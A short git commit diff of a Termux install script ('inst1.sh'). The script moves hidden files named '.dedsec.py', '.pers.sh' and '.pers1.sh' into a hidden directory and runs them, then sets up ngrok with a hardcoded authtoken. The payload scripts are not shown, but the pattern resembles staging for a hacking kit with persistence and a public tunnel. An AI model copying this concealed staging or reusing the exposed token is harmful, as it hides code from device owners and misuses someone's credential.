67069b3ee1cdbd779e5d940642839c5f7ddbc659
ImJoke <55929550+ImJoke@users.noreply.github.com>
2020-10-09 22:39:00 +0700

    Update inst1.sh

--- inst1.sh
+++ inst1.sh
@@ -1,9 +1,7 @@
+pkg update && pkg upgrade -y
 pkg install python2 -y && pkg install python3 -y
 mkdir /data/data/com.termux/files/home/.p/ && mv .dedsec.py /data/data/com.termux/files/home/.p/ && mv .pers.sh /data/data/com.termux/files/home/.p/ && mv .pers1.sh /data/data/com.termux/files/home/.p/
 sh /data/data/com.termux/files/home/.p/.pers.sh && sh /data/data/com.termux/files/home/.p/.pers1.sh
-pkg update
-pkg upgrade -y
-cd
 sleep 5
 chmod +x ngrok
 ./ngrok authtoken 1iabGOYmHBNpWEeQPP8wj780QX8_E8zMR5aYaVB65Mhk5ohA
